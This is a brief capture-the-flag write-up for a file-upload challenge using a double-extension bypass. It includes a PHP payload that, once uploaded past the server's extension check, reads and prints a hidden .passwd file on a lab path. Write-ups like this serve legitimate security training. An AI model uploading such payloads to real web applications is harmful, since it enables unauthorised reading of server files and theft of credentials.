# 🧩Challenge : File Upload - Double extensions

# 🔍 Description
- The main objective of this challenge is to upload a PHP file to the web application in order to read the hidden .passwd file and retrieve the password.

- When checking the upload feature, we notice that PHP extension is not allowed by the server’s validation rules.

- To bypass this restriction, we create a simple PHP payload that reads the password file

# ⚙️ Exploitation
```php
<?php $ressource = fopen('/challenge/web-serveur/ch20/.passwd', 'rb');
    echo 'Mot de passe : ' .fgets($ressource, 30)?>
```